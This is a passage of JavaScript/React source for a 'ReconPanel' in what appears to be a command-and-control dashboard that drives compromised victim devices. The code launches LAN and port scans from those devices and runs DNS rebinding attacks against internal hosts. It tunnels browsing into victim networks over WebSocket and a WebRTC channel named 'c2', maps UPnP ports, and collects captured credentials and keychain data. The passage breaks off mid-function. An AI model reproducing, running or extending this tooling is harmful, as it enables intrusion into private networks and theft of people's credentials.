function ReconPanel({ deviceId, events, device, onSent, deviceIp, onToast }) {
  const [lanSending, setLanSending] = useState(false);
  const [dnsSending, setDnsSending] = useState(false);
  const [tabSending, setTabSending] = useState(false);
  const [swEnabled, setSwEnabled] = useState(false);
  const [swSending, setSwSending] = useState(false);
  const [dnsHosts, setDnsHosts] = useState('');
  const [lanCIDR, setLanCIDR] = useState('');
  const [portScanIP, setPortScanIP] = useState('');
  const [portScanPorts, setPortScanPorts] = useState('');
  const [portScanSending, setPortScanSending] = useState(false);

  // Device online check - last_seen within 10 minutes (updated on every beacon flush)
  const deviceOnline = device?.last_seen
    ? (Date.now() - parseUTC(device.last_seen).getTime()) < 10 * 60 * 1000
    : false;

  // DNS Rebinding launch state
  const rbDomain = localStorage.getItem('wc_rebind_domain') ?? '';
  const rbVpsIp  = localStorage.getItem('wc_rebind_vps_ip') ?? '';
  const [rbHealth, setRbHealth] = useState(null); // null = not checked yet
  useEffect(() => {
    if (!rbDomain) return;
    const params = new URLSearchParams({ domain: rbDomain, vps_ip: rbVpsIp });
    apiFetch(`/api/settings/rebind-health?${params}`).then(h => setRbHealth(h)).catch(() => {});
  }, []); // eslint-disable-line react-hooks/exhaustive-deps
  const rbReady = rbHealth &&
    rbHealth.server_running &&
    rbHealth.certs_installed &&
    rbHealth.port_53_listening &&
    rbHealth.ns_delegation?.ok;
  const _pfSaved    = (() => { try { return JSON.parse(localStorage.getItem('wc_rb_preflip') || 'null'); } catch { return null; } })();
  const _pfMatch    = _pfSaved?.deviceId === deviceId;
  const _pfIsReady  = _pfMatch && _pfSaved?.state === 'ready';
  const _pfIsPriming = _pfMatch && _pfSaved?.state === 'priming' && Date.now() - (_pfSaved.startTs || 0) < 120000;
  const _pfHasSaved = _pfIsReady || _pfIsPriming;
  const [rbTargetIP,   setRbTargetIP]   = useState(_pfHasSaved ? (_pfSaved.targetIP   || '')   : '');
  const [rbTargetPort, setRbTargetPort] = useState(_pfHasSaved ? (_pfSaved.targetPort || '80') : '80');
  const [rbTargetPath, setRbTargetPath] = useState(_pfHasSaved ? (_pfSaved.targetPath || '/')  : '/');
  const [rbRunning,    setRbRunning]    = useState(false);
  const [rbResult,     setRbResult]     = useState(null);
  const [rbStatusMsg,  setRbStatusMsg]  = useState('');
  const [rbLiveStatus, setRbLiveStatus] = useState(null);
  const [rbPreflip,    setRbPreflip]    = useState(_pfIsReady ? 'ready' : _pfIsPriming ? 'priming' : 'idle'); // 'idle'|'priming'|'ready'
  const [rbPreflipSec, setRbPreflipSec] = useState(_pfIsPriming ? Math.floor((Date.now() - (_pfSaved?.startTs || 0)) / 1000) : 0);
  const [rbDnsStatus,  setRbDnsStatus]  = useState(null); // live query-status from Flask
  const [rbTunnelPath, setRbTunnelPath] = useState('/');
  const [rbTunnelLoading, setRbTunnelLoading] = useState(false);
  const [rbTunnelResp, setRbTunnelResp] = useState(null);
  const rbTokenRef        = useRef(null);
  const rbSentAtRef       = useRef(null);
  const rbPollRef         = useRef(null);
  const rbPreflipTimerRef = useRef(null);
  const rbPreflipPollRef  = useRef(null);
  const rbPrimingResumeRef = useRef(false);
  const rbTunnelPollRef   = useRef(null);
  const rbWsRef           = useRef(null); // WebSocket tunnel relay
  const [rbWsDead, setRbWsDead] = useState(false);
  const [rbVictimWs, setRbVictimWs] = useState(false);
  // WebRTC P2P tunnel state
  const [rtcStatus,    setRtcStatus]    = useState('idle'); // idle|negotiating|connected|failed
  const rtcPcRef  = useRef(null);
  const rtcChRef  = useRef(null);
  const [rtcLatency,   setRtcLatency]   = useState(null);
  const [rbUpnp,       setRbUpnp]    = useState(null); // upnp_found result
  const [rbUpnpSoap,   setRbUpnpSoap] = useState({ extPort: '', intIP: '', intPort: '', proto: 'TCP', desc: 'RBTest' });
  const [rbUpnpSoapResult, setRbUpnpSoapResult] = useState(null);
  const [mdmStatus,     setMdmStatus]     = useState(null);   // mdm_result
  const [capturedCreds, setCapturedCreds] = useState([]);     // credentials_found / keychain_found / portal_creds
  const [rbLivePort,    setRbLivePort]    = useState('80');
  const [rbLiveIP,      setRbLiveIP]      = useState('');
  const [rbTunnelStart, setRbTunnelStart] = useState(null);
  const [rbWsTick,      setRbWsTick]      = useState(0);
  const RB_PREFLIP_MAX    = 120;
  const RB_PREFLIP_KEY    = 'wc_rb_preflip';
  useEffect(() => () => clearInterval(rbPollRef.current),        []);
  useEffect(() => () => clearInterval(rbPreflipTimerRef.current), []);
  useEffect(() => () => clearInterval(rbPreflipPollRef.current), []);
  useEffect(() => () => clearInterval(rbTunnelPollRef.current),  []);
  useEffect(() => () => { try { rbWsRef.current?.close(); } catch {} }, []);
  useEffect(() => { const id = setInterval(() => setRbWsTick(t => t + 1), 1000); return () => clearInterval(id); }, []);
  // Restore pending attack after page refresh
  useEffect(() => {
    const saved = (() => { try { return JSON.parse(localStorage.getItem('wc_pending_rb') || 'null'); } catch { return null; } })();
    if (saved?.token && Date.now() - saved.startTs < 5 * 60 * 1000) {
      rbTokenRef.current   = saved.token;
      rbSentAtRef.current  = saved.startTs;
      setRbRunning(true);
      setRbStatusMsg('Resumed attack - polling relay…');
      _rbStartPoll(saved.token);
    }
  }, []); // eslint-disable-line react-hooks/exhaustive-deps
  // Notify when component mounts with DNS already armed (e.g. after returning to tab)
  useEffect(() => {
    if (rbPreflip === 'ready') onToast?.('DNS Armed - ready to fire');
  }, []); // eslint-disable-line react-hooks/exhaustive-deps
  // Resume pre-flip priming after page refresh / navigation
  useEffect(() => {
    if (rbPrimingResumeRef.current) return;
    rbPrimingResumeRef.current = true;
    const saved = (() => { try { return JSON.parse(localStorage.getItem('wc_rb_preflip') || 'null'); } catch { return null; } })();
    if (saved?.state !== 'priming' || saved?.deviceId !== deviceId) return;
    // Legacy 'priming' state - complete it immediately (flip API already fired before page unload)
    localStorage.setItem(RB_PREFLIP_KEY, JSON.stringify({ state: 'ready', deviceId, targetIP: saved.targetIP, targetPort: saved.targetPort, targetPath: saved.targetPath, readyAt: Date.now() }));
    setRbPreflip('ready');
    onToast?.('DNS armed - ready to fire');
    rbPreflipPollRef.current = setInterval(async () => {
      try {
        const st = await apiFetch('/api/rb/query-status');
        setRbDnsStatus(st);
      } catch {}
    }, 2000);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps
  function _rbStartPoll(token) {
    clearInterval(rbPollRef.current);
    let ticks = 0;
    rbPollRef.current = setInterval(async () => {
      ticks++;
      if (ticks > 120) {
        clearInterval(rbPollRef.current);
        setRbRunning(false); setRbStatusMsg('Timed out - no result received'); setRbLiveStatus(null);
        localStorage.removeItem('wc_pending_rb'); return;
      }
      try {
        const st = await apiFetch(`/api/rb/status/${token}`).catch(() => null);
        if (st?.status) setRbLiveStatus(st.status);
        const relay = await apiFetch(`/api/rb/result/${token}`);
        if (relay?.ready && relay?.result) {
          clearInterval(rbPollRef.current);
          setRbRunning(false); setRbStatusMsg(''); setRbLiveStatus(null);
          setRbResult(relay.result);
          localStorage.removeItem('wc_pending_rb');
          _rbConnectWs(token);
          // Also poll for UPnP result (HTTP fallback)
          setTimeout(async () => {
            const upnp = await apiFetch(`/api/rb/upnp/${encodeURIComponent(token)}`).catch(() => null);
            if (upnp?.ready && upnp?.result) setRbUpnp(upnp.result);
          }, 3000);
          setTimeout(async () => {
            const upnp = await apiFetch(`/api/rb/upnp/${encodeURIComponent(token)}`).catch(() => null);
            if (upnp?.ready && upnp?.result) setRbUpnp(upnp.result);
          }, 8000);
        }
      } catch {}
    }, 1500);
  }
  async function rbPreFlip() {
    if (!rbDomain || !rbTargetIP) return;
    clearInterval(rbPreflipTimerRef.current); clearInterval(rbPreflipPollRef.current);
    setRbDnsStatus(null);
    // Fast re-arm: if same target was armed recently (<15 min), skip the full 120s cycle
    try {
      const prev = JSON.parse(localStorage.getItem(RB_PREFLIP_KEY) || 'null');
      if (prev?.state === 'ready' && prev?.deviceId === deviceId && prev?.targetIP === rbTargetIP
          && prev?.readyAt && Date.now() - prev.readyAt < 900000) {
        setRbPreflip('ready');
        onToast?.('DNS re-armed (cache) - ready to fire');
        return;
      }
    } catch {}
    // Check if DNS server already has this target flipped
    try {
      const st = await apiFetch('/api/rb/query-status');
      if (Array.isArray(st?.flip_targets) && st.flip_targets.includes(rbTargetIP)) {
        localStorage.setItem(RB_PREFLIP_KEY, JSON.stringify({ state: 'ready', deviceId, targetIP: rbTargetIP, targetPort: rbTargetPort, targetPath: rbTargetPath, readyAt: Date.now() }));
        setRbPreflip('ready');
        onToast?.('DNS already armed - ready to fire');
        return;
      }
    } catch {}
    // Flip API configures the DNS server instantly - no waiting needed
    setRbPreflip('priming'); // brief visual feedback during API call
    await apiFetch(`/api/rb/flip?target=${encodeURIComponent(rbTargetIP)}`).catch(() => {});
    localStorage.setItem(RB_PREFLIP_KEY, JSON.stringify({ state: 'ready', deviceId, targetIP: rbTargetIP, targetPort: rbTargetPort, targetPath: rbTargetPath, readyAt: Date.now() }));
    setRbPreflip('ready');
    onToast?.('DNS armed - ready to fire');
    // Background poll for live DNS status info only (no gate control)
    rbPreflipPollRef.current = setInterval(async () => {
      try {
        const st = await apiFetch('/api/rb/query-status');
        setRbDnsStatus(st);
      } catch {}
    }, 2000);
  }
  function rbCancelPreflip() {
    clearInterval(rbPreflipTimerRef.current); clearInterval(rbPreflipPollRef.current);
    if (rbPreflip === 'priming') {
      // Cancel during priming: unflip DNS and discard the in-progress arm
      localStorage.removeItem(RB_PREFLIP_KEY);
      apiFetch('/api/rb/unflip').catch(() => {});
    }
    // When cancelling from 'ready', keep localStorage so a quick re-arm skips the 120s wait
    setRbPreflip('idle'); setRbPreflipSec(0);
  }
  async function rbRunLaunch() {
    if (!deviceId || !rbDomain || !rbTargetIP) return;
    // Kill any active tunnel from previous attack (WS mode + HTTP fallback)
    const oldToken = rbTokenRef.current;
    if (oldToken) {
      const oldWs = rbWsRef.current;
      if (oldWs && oldWs.readyState === WebSocket.OPEN) {
        oldWs.send(JSON.stringify({ type: 'end_tunnel' }));
      }
      await apiFetch('/api/rb/tunnel/end', { method: 'POST', body: JSON.stringify({ token: oldToken }) }).catch(() => {});
      await new Promise(r => setTimeout(r, 1500));
      try { rbWsRef.current?.close(); } catch {}
      rbWsRef.current = null;
    }
    localStorage.removeItem(RB_PREFLIP_KEY);
    setRbRunning(true); setRbResult(null); setRbLiveStatus(null);
    setRbStatusMsg('Sending launch command…');
    rbSentAtRef.current = Date.now();
    const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
    rbTokenRef.current = token;
    localStorage.setItem('wc_pending_rb', JSON.stringify({ token, startTs: rbSentAtRef.current }));
    // Use a fresh random subdomain - iOS has no cached DNS for it, so 0.5s unflip wait is enough
    // (vs 8s for the base domain which iOS may have cached as the router IP).
    const randomSub = 'rb' + Math.random().toString(36).slice(2, 8);
    const attackDomain = randomSub + '.' + rbDomain;
    const isArmed = rbPreflip === 'ready';
    setRbStatusMsg(isArmed ? 'Pre-armed - clearing DNS (0.5s)…' : 'Clearing DNS cache…');
    await apiFetch('/api/rb/unflip').catch(() => {});
    await new Promise(r => setTimeout(r, isArmed ? 500 : 2000));
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, { method: 'DELETE' }).catch(() => {});
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'rebind_launch', payload: {
          domain: attackDomain, targetIP: rbTargetIP,
          targetPort: parseInt(rbTargetPort) || 80, targetPath: rbTargetPath || '/',
          timeout: 90000, token, vpsIP: rbVpsIp, preflipped: isArmed,
        }}),
      });
      setRbStatusMsg('Attack page loading - waiting for result…');
    } catch (e) { setRbStatusMsg(`Send error: ${e.message} - still watching`); }
    _rbStartPoll(token);
  }
  function _rbConnectWs(token) {
    try { rbWsRef.current?.close(); } catch {}
    const proto = location.protocol === 'https:' ? 'wss' : 'ws';
    // WS relay lives on collection_app (clipper), not dashboard_app - connect to the right process.
    const wsHost = location.hostname.replace(/^dashboard\./, 'clipper.');
    const ws = new WebSocket(`${proto}://${wsHost}/api/ws/rb/${token}?role=controller`);
    ws.onmessage = (e) => {
      try {
        const msg = JSON.parse(e.data);
        if (msg.type === 'browse_result') {
          setRbTunnelLoading(false);
          setRbTunnelResp({ ok: msg.error == null, status: msg.status, body: msg.body, error: msg.error, url: msg.url });
        } else if (msg.type === 'upnp_found') {
          setRbUpnp(msg);
        } else if (msg.type === 'mdm_result') {
          setMdmStatus(msg);
        } else if (msg.type === 'credentials_found' || msg.type === 'keychain_found' || msg.type === 'portal_creds') {
          setCapturedCreds(prev => [...prev, { ...msg, _ts: Date.now() }]);
        } else if (msg.type === 'peer_connected' && msg.role === 'victim') {
          setRbVictimWs(true);
        } else if (msg.type === 'peer_disconnected' && msg.role === 'victim') {
          setRbVictimWs(false);
          setRbTunnelStart(null);
        } else if (msg.type === 'tunnel_ready') {
          setRbVictimWs(true);
        }
      } catch {}
    };
    ws.onclose = () => { if (rbWsRef.current === ws) { rbWsRef.current = null; setRbWsDead(true); setRbVictimWs(false); } };
    ws.onopen  = () => { setRbWsDead(false); setRbVictimWs(false); setRbTunnelStart(Date.now()); setRbLiveIP(rbTargetIP); setRbLivePort(rbTargetPort || '80'); };
    rbWsRef.current = ws;
  }
  async function rbStopAttack() {
    clearInterval(rbPollRef.current);
    setRbRunning(false); setRbStatusMsg(''); setRbLiveStatus(null);
    const token = rbTokenRef.current;
    if (token) await apiFetch('/api/rb/tunnel/end', { method: 'POST', body: JSON.stringify({ token }) }).catch(() => {});
    try { rbWsRef.current?.close(); } catch {}
    rbWsRef.current = null;
    localStorage.removeItem('wc_pending_rb');
    await apiFetch(`/api/devices/${deviceId}/commands`, { method: 'DELETE' }).catch(() => {});
  }
  async function rbBrowseTunnel(path) {
    const token = rbTokenRef.current;
    const url = path || rbTunnelPath || '/';
    if (!token || rbTunnelLoading) return;
    setRbTunnelLoading(true); setRbTunnelResp(null);
    // Try WebRTC DataChannel first (lowest latency P2P)
    if (rtcChRef.current?.readyState === 'open') {
      const reqId = Math.random().toString(36).slice(2);
      rtcChRef.current.send(JSON.stringify({ type: 'browse_request', req_id: reqId, url }));
      // Response arrives via dc.onmessage → setRbTunnelResp
      return;
    }
    // Try WebSocket next (low latency), fall back to HTTP polling
    const ws = rbWsRef.current;
    if (ws && ws.readyState === WebSocket.OPEN) {
      const reqId = Math.random().toString(36).slice(2);
      ws.send(JSON.stringify({ type: 'browse_request', req_id: reqId, url }));
      // Response arrives via ws.onmessage → setRbTunnelResp
      return;
    }
    // HTTP polling fallback
    try {
      const res = await apiFetch('/api/rb/tunnel/request', { method: 'POST', body: JSON.stringify({ token, url }) });
      if (!res.ok) { setRbTunnelResp({ ok: false, error: 'Failed to queue request' }); setRbTunnelLoading(false); return; }
      const reqId = res.req_id; let ticks2 = 0;
      clearInterval(rbTunnelPollRef.current);
      rbTunnelPollRef.current = setInterval(async () => {
        ticks2++;
        if (ticks2 > 60) { clearInterval(rbTunnelPollRef.current); setRbTunnelLoading(false); setRbTunnelResp({ ok: false, error: 'Timed out' }); return; }
        try {
          const r = await apiFetch(`/api/rb/tunnel/result/${token}/${reqId}`);
          if (r.ready && r.result) { clearInterval(rbTunnelPollRef.current); setRbTunnelLoading(false); setRbTunnelResp(r.result); }
        } catch {}
      }, 1500);
    } catch (e) { setRbTunnelResp({ ok: false, error: e.message }); setRbTunnelLoading(false); }
  }
  async function rbEndTunnel() {
    const token = rbTokenRef.current;
    const ws = rbWsRef.current;
    if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type: 'end_tunnel' }));
    if (token) await apiFetch('/api/rb/tunnel/end', { method: 'POST', body: JSON.stringify({ token }) }).catch(() => {});
    setRbResult(null); setRbTunnelResp(null); setRbTunnelStart(null); rbTokenRef.current = null;
    localStorage.removeItem('wc_pending_rb');
  }

  async function _rbInitWebRTC(token) {
    if (!token) return;
    // Close any previous P2P session
    try { rtcPcRef.current?.close(); } catch {}
    rtcPcRef.current = null; rtcChRef.current = null;
    setRtcStatus('negotiating'); setRtcLatency(null);

    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
    rtcPcRef.current = pc;

    // Create DataChannel on controller side
    const dc = pc.createDataChannel('c2');
    rtcChRef.current = dc;

    dc.onopen = () => {
      setRtcStatus('connected');
      // Measure latency with a ping/pong
      const pingStart = Date.now();
      dc.send(JSON.stringify({ type: 'ping', ts: pingStart }));
      const _pongHandler = (e) => {
        try {
          const msg = JSON.parse(e.data);
          if (msg.type === 'pong') {
            setRtcLatency(Date.now() - pingStart);
            dc.removeEventListener('message', _pongHandler);
          } else if (msg.type === 'browse_result') {
            setRbTunnelLoading(false);
            setRbTunnelResp({ ok: msg.ok, status: msg.status, body: msg.body, error: msg.error, url: msg.url });
          }
        } catch {}
      };
      dc.addEventListener('message', _pongHandler);
    };

    dc.onmessage = (e) => {
      try {
        const msg = JSON.parse(e.data);
        if (msg.type === 'browse_result') {
          setRbTunnelLoading(false);
          setRbTunnelResp({ ok: msg.ok, status: msg.status, body: msg.body, error: msg.error, url: msg.url });
        }
      } catch {}
    };

    dc.onclose = () => { setRtcStatus('idle'); rtcChRef.current = null; };

    // Collect ICE candidates and POST them to relay
    pc.onicecandidate = (e) => {
      if (e.candidate) {
        apiFetch(`/api/webrtc/ice/${token}`, {
          method: 'POST',
          body: JSON.stringify({ role: 'controller', candidate: e.candidate }),
        }).catch(() => {});
      }
    };

    // Create offer
    const offer = await pc.createOffer();
    await pc.setLocalDescription(offer);

    // POST offer to signaling relay
    await apiFetch(`/api/webrtc/offer/${token}`, {
      method: 'POST',
      body: JSON.stringify({ sdp: offer.sdp, type: offer.type }),
    });

    // Send webrtc_init command to device to kick off victim side
    try {
      await apiFetch(`/api/devices/${deviceId}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'webrtc_init', payload: { token } }),
      });
    } catch {}

    // Poll for victim's answer
    for (let i = 0; i < 60; i++) {
      await new Promise(r => setTimeout(r, 2000));
      let ans = null;
      try { ans = await apiFetch(`/api/webrtc/answer/${token}`); } catch {}
      if (ans?.ready && ans.answer) {
        await pc.setRemoteDescription(new RTCSessionDescription(ans.answer));
        break;
      }
    }

    // Poll for victim's ICE candidates
    let iceSince = 0;
    const _iceTimer = setInterval(async () => {
      if (!rtcPcRef.current || rtcPcRef.current.connectionState === 'closed') {
        clearInterval(_iceTimer); return;
      }
      try {
        const r = await apiFetch(`/api/webrtc/ice/${token}?role=controller&since=${iceSince}`);
        if (r?.candidates?.length) {
          for (const c of r.candidates) {
            try { await pc.addIceCandidate(new RTCIceCandidate(c)); } catch {}
            iceSince++;
          }
        }
      } catch {}
      if (pc.connectionState === 'connected' || pc.connectionState === 'closed' || pc.connectionState === 'failed') {
        clearInterval(_iceTimer);
        if (pc.connectionState === 'failed') setRtcStatus('failed');
      }
    }, 1000);
  }

  // Persist stopped/started state across refreshes per device
  const _stopKey  = `wc_scan_stopped_${deviceId}`;
  const _startKey = `wc_scan_started_${deviceId}`;
  const [scanForceStopped, _setScanForceStopped] = useState(() => {
    try { return localStorage.getItem(_stopKey) === '1'; } catch { return false; }
  });
  const [scanStartedAt, _setScanStartedAt] = useState(() => {
    try { const v = localStorage.getItem(_startKey); return v ? new Date(v) : null; } catch { return null; }
  });
  const setScanForceStopped = (v) => {
    _setScanForceStopped(v);
    try { if (v) localStorage.setItem(_stopKey, '1'); else localStorage.removeItem(_stopKey); } catch {}
  };
  const setScanStartedAt = (v) => {
    _setScanStartedAt(v);
    try { if (v) localStorage.setItem(_startKey, v.toISOString()); else localStorage.removeItem(_startKey); } catch {}
  };

  const sendRecon = async (type, payload) => {
    await apiFetch(`/api/devices/${deviceId}/commands`, {
      method: 'POST',
      body: JSON.stringify({ type, payload: payload ?? {} }),
    });
    onSent?.();
  };

  // Latest results from events
  const lanStatus = parseEvent(events?.find(e => e.type === 'lan_scan_status'));
  // Treat a scan as stale (not actively scanning) if its last status update is > 2 min old
  const _statusTs  = parseUTC(events?.find(e => e.type === 'lan_scan_status')?.timestamp);
  const _statusAge = _statusTs ? (Date.now() - _statusTs) / 1000 : Infinity;
  const _activeScan = (lanStatus?.phase === 'scanning' || lanStatus?.phase === 'discovery' || lanStatus?.phase === 'gateway_probe') && _statusAge < 10;
  const scanning  = !scanForceStopped && _activeScan;
  const scanDone  = lanStatus?.phase === 'done' || (scanForceStopped && _activeScan) || (!_activeScan && lanStatus?.phase !== 'failed' && lanStatus);
  const scanFailed = lanStatus?.phase === 'failed';

  // Auto-clear the "force stopped" flag once the scan is no longer active (done, aborted, or timed out)
  useEffect(() => {
    if (!_activeScan && scanForceStopped) setScanForceStopped(false);
  }, [_activeScan]);  // eslint-disable-line react-hooks/exhaustive-deps

  // Only show lan results from after scanStartedAt (hide stale results while scanning)
  const _latestIPs    = events?.find(e => e.type === 'lan_local_ips');
  const _latestHosts  = events?.find(e => e.type === 'lan_hosts');
  const showStale     = !scanning || !scanStartedAt;
  const lanIPs   = parseEvent(showStale || (parseUTC(_latestIPs?.timestamp) > scanStartedAt) ? _latestIPs : null);
  const lanHosts = parseEvent(showStale || (parseUTC(_latestHosts?.timestamp) > scanStartedAt) ? _latestHosts : null);

  const dnsRes    = parseEvent(events?.find(e => e.type === 'dns_results'));
  const tabSnap   = parseEvent(events?.find(e => e.type === 'tab_snapshot'));
  const swLog     = parseEvent(events?.find(e => e.type === 'sw_intercept_log'));
  const _portScanStatusEv = events?.find(e => e.type === 'port_scan_status');
  const portScanStatus  = parseEvent(_portScanStatusEv);
  const portScanResults = parseEvent(events?.find(e => e.type === 'port_scan_results'));
  // If last scan_status is 'scanning' but the event is >3 min old, treat as stale
  const _pssAge = _portScanStatusEv ? (Date.now() - parseUTC(_portScanStatusEv.timestamp)?.getTime()) / 1000 : 0;
  const portScanStale = portScanStatus?.phase === 'scanning' && _pssAge > 180;

  const btnStyle = (color) => ({
    padding: '7px 14px', borderRadius: 8, border: `1px solid ${color}55`,
    background: `${color}22`, color, fontSize: 12, fontWeight: 600, cursor: 'pointer',
  });

  return (
    <>

      {/* LAN Scan */}
      <div style={{ padding: '12px 14px', borderBottom: '1px solid #1c1c1e' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 8, flexWrap: 'wrap' }}>
          <span style={{ fontSize: 12, fontWeight: 600, color: '#c9d1e8' }}>LAN Scan</span>
          <input
            value={lanCIDR}
            onChange={e => setLanCIDR(e.target.value)}
            placeholder="auto  or  192.168.1.0/24"
            style={{ flex: 1, minWidth: 160, background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', borderRadius: 6, padding: '4px 8px', fontSize: 11, fontFamily: 'monospace' }}
          />
          <button disabled={lanSending || scanning} onClick={async () => {
            setScanForceStopped(false);
            setScanStartedAt(new Date());
            setLanSending(true);
            try {
              const payload = {};
              const cidrVal = lanCIDR.trim();
              if (cidrVal && cidrVal.toLowerCase() !== 'auto') payload.cidr = cidrVal;
              await sendRecon('lan_scan', payload);
            }
            catch (e) { alert(e.message); }
            finally { setLanSending(false); }
          }} style={{ ...btnStyle('#22c55e'), opacity: (lanSending || scanning) ? 0.5 : 1 }}>
            {lanSending ? '⏳' : '▶ Scan'}
          </button>
          {(scanning || scanForceStopped) && (
            <button onClick={async () => {
              setScanForceStopped(true);
              try { await sendRecon('lan_scan_stop', {}); } catch {}
            }} style={btnStyle(scanForceStopped ? '#4e5a70' : '#ef4444')}>
              {scanForceStopped ? '↺ Reset' : '⏹ Stop'}
            </button>
          )}
        </div>

        {/* Status line */}
        {lanStatus && (
          <div style={{ fontSize: 11, padding: '5px 8px', borderRadius: 6, marginBottom: 6,
            background: scanFailed ? 'rgba(239,68,68,0.07)' : scanDone ? 'rgba(34,197,94,0.07)' : 'rgba(59,130,246,0.07)',
            color: scanFailed ? '#ef4444' : scanDone ? '#22c55e' : '#3b82f6',
            fontFamily: 'monospace',
          }}>
            {scanning && '⏳ '}{scanDone && '✓ '}{scanFailed && '✗ '}{lanStatus.msg}
          </div>
        )}

        {lanIPs && (
          <div style={{ fontSize: 11, color: '#c9d1e8', background: '#07080f', borderRadius: 8, padding: '8px 10px', marginBottom: 6 }}>
            <div style={{ color: '#22c55e', fontWeight: 600, marginBottom: 4 }}>Local IPs</div>
            {lanIPs.ips?.map((ip, i) => <div key={i} style={{ fontFamily: 'monospace' }}>{ip}</div>)}
            {lanIPs.mdns_named?.map((name, i) => (
              <div key={i} style={{ color: '#f59e0b', fontFamily: 'monospace' }}>mDNS: {name}</div>
            ))}
            {lanIPs.ios_devices > 0 && (
              <div style={{ color: '#4e5a70', marginTop: 4 }}>
                + {lanIPs.ios_devices} iOS device{lanIPs.ios_devices !== 1 ? 's' : ''} (privacy-masked mDNS)
              </div>
            )}
          </div>
        )}
        {lanHosts?.hosts?.length > 0 && (() => {
          const dedupedHosts = [...new Map(lanHosts.hosts.map(h => [h.ip, h])).values()];
          return (
            <div style={{ fontSize: 11, background: '#07080f', borderRadius: 8, padding: '8px 10px' }}>
              <div style={{ color: '#22c55e', fontWeight: 600, marginBottom: 2 }}>
                Live Hosts - {lanHosts.cidr ?? lanHosts.subnet} ({dedupedHosts.length})
              </div>
              <div style={{ fontSize: 10, color: '#4e5a70', marginBottom: 6 }}>
                ⚠ Hosts with all probe ports DROP-firewalled will not appear. Results are indicative, not exhaustive.
              </div>
              <table style={{ width: '100%', borderCollapse: 'collapse' }}>
                <thead><tr style={{ color: '#4e5a70' }}>
                  <th style={{ textAlign: 'left', paddingBottom: 4 }}>IP</th>
                  <th style={{ textAlign: 'left', paddingBottom: 4 }}>Port</th>
                  <th style={{ textAlign: 'right', paddingBottom: 4 }}>ms</th>
                </tr></thead>
                <tbody>
                  {dedupedHosts.map((h, i) => (
                    <tr key={i} style={{ color: '#22c55e' }}>
                      <td style={{ fontFamily: 'monospace', paddingBottom: 2 }}>{h.ip}</td>
                      <td style={{ fontFamily: 'monospace', paddingBottom: 2, color: '#3b82f6' }}>{h.port ?? '-'}</td>
                      <td style={{ textAlign: 'right', paddingBottom: 2, color: '#4e5a70' }}>{h.ms}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          );
        })()}
      </div>

      {/* Port Scan */}
      <div style={{ padding: '12px 14px', borderBottom: '1px solid #1c1c1e' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 6, flexWrap: 'wrap' }}>
          <span style={{ fontSize: 12, fontWeight: 600, color: '#c9d1e8' }}>Port Scan</span>
          <input
            value={portScanIP}
            onChange={e => setPortScanIP(e.target.value)}
            placeholder="192.168.1.1"
            style={{ flex: 1, minWidth: 130, background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', borderRadius: 6, padding: '4px 8px', fontSize: 11, fontFamily: 'monospace' }}
          />
          <button disabled={portScanSending || (portScanStatus?.phase === 'scanning' && !portScanStale)} onClick={async () => {
            const ip = portScanIP.trim() || (/^\d{1,3}(\.\d{1,3}){3}$/.test(deviceIp) ? deviceIp : '');
            if (!ip) { alert('Enter an IPv4 address'); return; }
            if (!/^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
              alert('Enter a single IPv4 address (e.g. 192.168.1.1).\nTo avoid false positives, port scan targets one host at a time.'); return;
            }
            let ports = null;
            const raw = portScanPorts.trim();
            if (raw) {
              const parsed = [];
              for (const part of raw.split(',').map(s => s.trim()).filter(Boolean)) {
                const range = part.match(/^(\d+)-(\d+)$/);
                if (range) {
                  const lo = parseInt(range[1], 10), hi = parseInt(range[2], 10);
                  for (let p = lo; p <= Math.min(hi, lo + 1000); p++) parsed.push(p);
                } else {
                  const n = parseInt(part, 10);
                  if (n > 0 && n <= 65535) parsed.push(n);
                }
              }
              if (parsed.length) ports = [...new Set(parsed)].sort((a, b) => a - b);
            }
            setPortScanSending(true);
            try { await sendRecon('port_scan', ports ? { ip, ports } : { ip }); }
            catch (e) { alert(e.message); }
            finally { setPortScanSending(false); }
          }} style={{ ...btnStyle('#f59e0b'), opacity: (portScanSending || (portScanStatus?.phase === 'scanning' && !portScanStale)) ? 0.5 : 1 }}>
            {(portScanSending || (portScanStatus?.phase === 'scanning' && !portScanStale)) ? '⏳' : '▶ Scan'}
          </button>
          {portScanStale && _portScanStatusEv && (
            <button onClick={async () => {
              await apiFetch(`/api/devices/${deviceId}/events/${_portScanStatusEv.id}`, { method: 'DELETE' });
              load();
            }} style={{ ...btnStyle('#ef4444'), fontSize: 11, padding: '7px 10px' }} title="Clear stuck scan status">
              ✕ Reset
            </button>
          )}
        </div>
        <input
          value={portScanPorts}
          onChange={e => setPortScanPorts(e.target.value)}
          placeholder="ports: 80,443,8080-8090  (blank = defaults)"
          style={{ width: '100%', boxSizing: 'border-box', background: '#07080f', border: '1px solid #2c2c2e', color: '#c9d1e8', borderRadius: 6, padding: '4px 8px', fontSize: 11, fontFamily: 'monospace', marginBottom: 8 }}
        />

        {portScanStatus && (
          <div style={{ fontSize: 11, padding: '5px 8px', borderRadius: 6, marginBottom: 6,
            background: portScanStatus.phase === 'done' ? 'rgba(245,158,11,0.07)' : portScanStatus.phase === 'failed' ? 'rgba(239,68,68,0.07)' : 'rgba(245,158,11,0.07)',
            color: portScanStatus.phase === 'failed' ? '#ef4444' : '#f59e0b', fontFamily: 'monospace',
          }}>
            {portScanStatus.phase === 'scanning' && '⏳ '}{portScanStatus.phase === 'done' && '✓ '}
            {portScanStatus.msg}
          </div>
        )}

        {portScanResults?.results?.length > 0 && (() => {
          const all = [...portScanResults.results].filter(r => r.status !== 'blocked').sort((a, b) => a.port - b.port);
          const openCount = portScanResults.results.filter(r => r.status === 'open' || r.status === 'closed').length;
